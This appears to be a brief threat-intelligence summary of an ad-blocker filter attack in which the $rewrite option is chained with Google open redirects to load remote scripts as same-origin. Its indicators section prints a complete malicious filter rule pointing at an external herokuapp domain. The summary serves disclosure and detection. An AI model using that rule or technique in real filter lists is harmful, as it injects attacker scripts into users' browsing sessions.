Method of Attack: Allows ad blocking filter list maintainers to create filters that inject remote scripts into websites by rewriting web requests to relative URLs on the same origin, which can be chained with web service open redirects and XMLHttpRequest or Fetch to execute malicious scripts.
Chaining $rewrite filter option with web service open redirects to load and execute remote scripts from a different domain appearing as same origin.
Attack Vector: Malicious filter rules in ad blocker filter lists using the $rewrite option
Exploitation of web services with open redirects and permissive Content Security Policy allowing XMLHttpRequest or Fetch to execute fetched scripts
Indicators of Compromise: Filter rules using $rewrite option such as /^https://www.google.com/maps/_/js/k=.*/m=pw/.*/rs=.*/$rewrite=/search?hl=en-US&source=hp&biw=&bih=&q=majestic-ramsons.herokuapp.com&btnI=I%27m+Feeling+Lucky&gbv=1
Use of domains like majestic-ramsons.herokuapp.com in rewritten URLs
Open redirect URLs on google.com used in filter rules
